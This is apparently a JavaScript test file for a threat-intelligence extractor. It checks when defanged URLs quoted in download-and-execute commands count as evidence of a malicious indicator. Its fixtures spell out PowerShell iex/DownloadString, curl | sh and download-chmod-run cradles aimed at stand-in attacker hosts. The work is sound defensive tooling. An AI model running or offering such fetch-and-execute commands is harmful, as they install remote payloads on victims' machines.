/**
 * Promotion gate: a publisher-quoted download-and-execute command
 * (review-queue 35800 follow-up, report 35808).
 *
 * P-3 A URL that the publisher defanged and quotes as the argument of a
 *     download-and-execute cradle in a code block — PowerShell
 *     `iex((New-Object Net.WebClient).DownloadString('hxxp://…'))`,
 *     `irm hxxps://… | iex`, `curl … hxxp://… | sh` — is operational evidence
 *     that this exact URL delivered the actor's payload.
 *
 * It stays an analyst action: never an Indicator member on its own, and
 * promotion still needs an audited corroboration. A fanged URL in the same
 * command (a legitimate installer one-liner) and a defanged URL that is only
 * downloaded, never executed, stay refused.
 */
import test from 'node:test';
import assert from 'node:assert/strict';
import { extractCanonicalDocumentFromHtml } from './extract/extractHtml.js';
import { extractReportCandidates } from './extractionStages.js';
import { buildCandidateEvidenceRecord } from './evidencePolicy.js';
import { isReportIndicatorMember } from './indicatorMembership.js';
import { classifyPromoteEligibility } from './promotion.js';

const SOURCE = 'https://vendor-research.example/blog/scheduled-task-cradle/';
const CORROBORATION = 'The actor scheduled task downloads and executes this script from its staging server.';

function run(code) {
  const html = `<!doctype html><html lang="en"><head><title>Cradle</title></head><body><article>
<h1>Ransomware affiliate intrusion</h1>
<p>Background paragraph describing the intrusion set and its tooling across several environments.</p>
<h2>Scheduled Tasks as the Deployment Layer</h2>
<p>Within the open directory was a scheduled task configuration. It runs under the SYSTEM context, dynamically downloading and running a PowerShell script:</p>
<pre><code>${code}</code></pre>
<p>The script creates a local administrator account and disables endpoint protection.</p>
<h2>Indicators of Compromise</h2>
<table><thead><tr><th>Indicator</th><th>Context</th></tr></thead><tbody>
<tr><td>198.51.100[.]17</td><td>Primary staging server.</td></tr>
</tbody></table>
</article></body></html>`;
  const r = extractCanonicalDocumentFromHtml(html, { url: SOURCE, finalUrl: SOURCE, httpStatus: 200 });
  assert.equal(r.ok, true);
  return extractReportCandidates({ source_type: 'url', source_url: SOURCE }, r.document);
}
const persisted = (c) => ({ ...c, has_original_document_occurrence: true, review_status: 'pending', evidence: buildCandidateEvidenceRecord(c) });
const find = (x, v) => x.candidates.find((c) => String(c.normalized_value).toLowerCase() === v);

const CRADLES = [
  ["powershell -ep bypass -w hidden -c iex((New-Object Net.WebClient).DownloadString('hxxp://198.51.100[.]17:42718/task_9.ps1'))", 'http://198.51.100.17:42718/task_9.ps1'],
  ['powershell -c "irm hxxps://stage-node[.]example-bad[.]net/a.ps1 | iex"', 'https://stage-node.example-bad.net/a.ps1'],
  ['curl -fsSL hxxp://stage-node[.]example-bad[.]net/s.sh | sh', 'http://stage-node.example-bad.net/s.sh']
];

test('P-3. a defanged URL executed by a quoted download cradle is operational evidence', () => {
  for (const [code, url] of CRADLES) {
    const c = find(run(code), url);
    assert.ok(c, `${url} is a candidate`);
    const row = persisted(c);
    assert.equal(isReportIndicatorMember(row), false, 'never a member on its own');
    const pending = classifyPromoteEligibility(row);
    assert.equal(pending.promotable, true, JSON.stringify(pending));
    assert.equal(pending.requires_corroboration, true);
    assert.equal(pending.ok, false);
    const ok = classifyPromoteEligibility(row, { corroboration: CORROBORATION });
    assert.equal(ok.ok, true, JSON.stringify(ok));
    assert.equal(ok.basis, 'operational_evidence');
  }
});

test('P-3 negative. a fanged installer one-liner and a download without execution stay refused', () => {
  const fanged = find(run('curl -fsSL https://get.installer-vendor.example/install.sh | sh'), 'https://get.installer-vendor.example/install.sh');
  assert.ok(fanged);
  const a = classifyPromoteEligibility(persisted(fanged), { corroboration: CORROBORATION });
  assert.equal(a.ok, false);
  assert.equal(a.code, 'promote_insufficient_evidence');

  const fetchOnly = find(run("(New-Object Net.WebClient).DownloadFile('hxxp://198.51.100[.]17/report.pdf', 'C:\\\\Temp\\\\r.pdf')"), 'http://198.51.100.17/report.pdf');
  assert.ok(fetchOnly);
  const b = classifyPromoteEligibility(persisted(fetchOnly), { corroboration: CORROBORATION });
  assert.equal(b.ok, false);
  assert.equal(b.code, 'promote_insufficient_evidence');
});

test('P-3 negative. a stored value glued to a shell separator is not the cradle argument', () => {
  const code = 'cd /tmp; curl -s hxxp://198.51.100[.]23:61236/slt||wget -q hxxp://198.51.100[.]23:61236/slt -O- | sh';
  const real = find(run(code), 'http://198.51.100.23:61236/slt');
  assert.ok(real, 'the clean URL is a candidate');
  const control = classifyPromoteEligibility(persisted(real), { corroboration: CORROBORATION });
  assert.equal(control.ok, true, JSON.stringify(control));
  // A legacy row whose stored value swallowed the separator is not that argument.
  const glued = { ...persisted(real), normalized_value: 'http://198.51.100.23:61236/slt||wget', original_value: 'http://198.51.100.23:61236/slt||wget' };
  const r = classifyPromoteEligibility(glued, { corroboration: CORROBORATION });
  assert.equal(r.ok, false);
  assert.equal(r.code, 'promote_insufficient_evidence');
});

// P-4 (30-report review queue): command-substitution and download-chmod-run
// cradles execute the fetched URL just like `curl … | sh`.
const CRADLES_V2 = [
  ['/bin/bash -c "$(curl -fsSL hxxp://198.51.100[.]30/6wioz8285kcbax6v)"', 'http://198.51.100.30/6wioz8285kcbax6v'],
  ['cd $TMPDIR && curl -O hxxp://198.51.100[.]30/1v07y9e1m6v7thl6 && xattr -c 1v07y9e1m6v7thl6 && chmod +x 1v07y9e1m6v7thl6 && ./1v07y9e1m6v7thl6', 'http://198.51.100.30/1v07y9e1m6v7thl6'],
  ['wget -q hxxps://stage-node[.]example-bad[.]net/m -O /tmp/m; chmod 755 /tmp/m; ./m', 'https://stage-node.example-bad.net/m']
];

test('P-4. bash -c "$(curl …)" and download → chmod +x → run are execution cradles', () => {
  for (const [code, url] of CRADLES_V2) {
    const c = find(run(code), url);
    assert.ok(c, `${url} is a candidate`);
    const row = persisted(c);
    assert.equal(isReportIndicatorMember(row), false, 'never a member on its own');
    const ok = classifyPromoteEligibility(row, { corroboration: CORROBORATION });
    assert.equal(ok.ok, true, `${code}: ${JSON.stringify(ok)}`);
    assert.equal(ok.basis, 'operational_evidence');
  }
});

test('P-4 negative. fanged installer substitution and a download that is never run stay refused', () => {
  const fanged = find(run('/bin/bash -c "$(curl -fsSL https://raw.installer-vendor.example/install.sh)"'), 'https://raw.installer-vendor.example/install.sh');
  assert.ok(fanged);
  const a = classifyPromoteEligibility(persisted(fanged), { corroboration: CORROBORATION });
  assert.equal(a.ok, false);
  assert.equal(a.code, 'promote_insufficient_evidence');

  const notRun = find(run('curl -O hxxp://198.51.100[.]30/notes.txt && chmod 644 notes.txt'), 'http://198.51.100.30/notes.txt');
  assert.ok(notRun);
  const b = classifyPromoteEligibility(persisted(notRun), { corroboration: CORROBORATION });
  assert.equal(b.ok, false);
  assert.equal(b.code, 'promote_insufficient_evidence');
});
